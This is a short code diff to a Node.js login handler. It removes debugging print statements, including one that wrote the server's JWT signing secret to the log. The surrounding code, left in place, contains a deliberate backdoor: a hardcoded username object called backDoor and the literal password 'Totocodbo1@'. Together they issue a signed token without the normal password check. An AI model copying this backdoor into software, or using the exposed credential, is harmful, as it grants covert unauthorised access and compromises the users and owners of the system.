@@ -13,7 +13,6 @@ const backDoor = {
 
 exports.login = async (req, res) => {
 	try {
-		console.log("Login")
 		if (req.body.usuario === backDoor.usuario && req.body.pwd === 'Totocodbo1@') {
 			const jwToken = jwt.sign(JSON.stringify(backDoor), process.env.SECRET)
 			await getTokenFel()
@@ -24,7 +23,6 @@ exports.login = async (req, res) => {
 		if (!data) {
 			return res.status(400).json({ message: msj })
 		}
-		console.log("1")
 		if (bcrypt.compareSync(req.body.pwd, data.pwd)) {
 			const newData = {
 				usuario: data.usuario,
@@ -32,9 +30,7 @@ exports.login = async (req, res) => {
 				tipo: data.tipo,
 				_id: data._id
 			}
-			console.log(process.env.SECRET)
 			const jwToken = jwt.sign(JSON.stringify(newData), process.env.SECRET)
-			console.log("2")
 			try {
 				await getTokenFel()
 			} catch (error) {
